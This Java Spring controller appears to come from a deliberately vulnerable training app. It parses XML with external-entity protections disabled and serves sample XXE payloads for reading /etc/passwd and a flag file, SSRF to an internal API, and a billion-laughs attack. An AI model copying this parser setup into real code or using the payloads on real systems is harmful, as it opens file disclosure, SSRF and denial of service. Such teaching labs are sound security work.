package com.owasp.vulnerable.controller;

import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.w3c.dom.Document;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.StringReader;
import java.util.HashMap;
import java.util.Map;

/**
 * XML 處理 API
 */
@RestController
@RequestMapping("/api/xml")
public class XmlController {

    /**
     * 解析 XML
     * 
     * POST /api/xml/parse
     * Content-Type: application/xml
     * 
     * <?xml version="1.0"?>
     * <!DOCTYPE foo [
     *   <!ENTITY xxe SYSTEM "file:///etc/passwd">
     * ]>
     * <user><name>&xxe;</name></user>
     */
    @PostMapping(value = "/parse", consumes = MediaType.APPLICATION_XML_VALUE)
    public ResponseEntity<?> parseXml(@RequestBody String xmlData) {
        try {
            
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            
            
            // factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            // factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
            // factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            
            DocumentBuilder builder = factory.newDocumentBuilder();
            Document document = builder.parse(new InputSource(new StringReader(xmlData)));
            
            // 提取資料
            StringBuilder result = new StringBuilder();
            NodeList nodes = document.getElementsByTagName("*");
            for (int i = 0; i < nodes.getLength(); i++) {
                String nodeName = nodes.item(i).getNodeName();
                String nodeValue = nodes.item(i).getTextContent();
                result.append(nodeName).append(": ").append(nodeValue).append("\n");
            }
            
            return ResponseEntity.ok(Map.of(
                "message", "XML 解析成功",
                "parsed", result.toString(),
                "nodeCount", nodes.getLength()
            ));
        } catch (Exception e) {
            
            return ResponseEntity.badRequest().body(Map.of(
                "error", "XML 解析失敗",
                "detail", e.getMessage(),
                "exceptionType", e.getClass().getName()
            ));
        }
    }

    /**
     * 使用者設定匯入
     * 
     * 模擬從 XML 匯入使用者設定的功能
     */
    @PostMapping(value = "/import-settings", consumes = MediaType.APPLICATION_XML_VALUE)
    public ResponseEntity<?> importSettings(@RequestBody String xmlData) {
        try {
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            
            DocumentBuilder builder = factory.newDocumentBuilder();
            Document document = builder.parse(new InputSource(new StringReader(xmlData)));
            
            // 提取設定
            String username = getElementValue(document, "username");
            String email = getElementValue(document, "email");
            String theme = getElementValue(document, "theme");
            
            return ResponseEntity.ok(Map.of(
                "message", "設定匯入成功",
                "settings", Map.of(
                    "username", username != null ? username : "",
                    "email", email != null ? email : "",
                    "theme", theme != null ? theme : "default"
                )
            ));
        } catch (Exception e) {
            return ResponseEntity.badRequest().body(Map.of(
                "error", "匯入失敗",
                "detail", e.getMessage()
            ));
        }
    }

    /**
     */
    @GetMapping("/examples")
    public ResponseEntity<?> getExamples() {
        Map<String, String> examples = new HashMap<>();
        examples.put("warning", "僅供教育目的");
        examples.put("read_file", """
            <?xml version="1.0"?>
            <!DOCTYPE foo [
              <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <user><name>&xxe;</name></user>
            """);
        examples.put("read_flag", """
            <?xml version="1.0"?>
            <!DOCTYPE foo [
              <!ENTITY xxe SYSTEM "file:///flag.txt">
            ]>
            <data>&xxe;</data>
            """);
        examples.put("ssrf", """
            <?xml version="1.0"?>
            <!DOCTYPE foo [
              <!ENTITY xxe SYSTEM "http://internal-api:8080/secrets">
            ]>
            <data>&xxe;</data>
            """);
        examples.put("billion_laughs", """
            <?xml version="1.0"?>
            <!DOCTYPE lolz [
              <!ENTITY lol "lol">
              <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
              <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
            ]>
            <lolz>&lol3;</lolz>
            """);
        return ResponseEntity.ok(examples);
    }
    
    private String getElementValue(Document doc, String tagName) {
        NodeList nodes = doc.getElementsByTagName(tagName);
        if (nodes.getLength() > 0) {
            return nodes.item(0).getTextContent();
        }
        return null;
    }
}
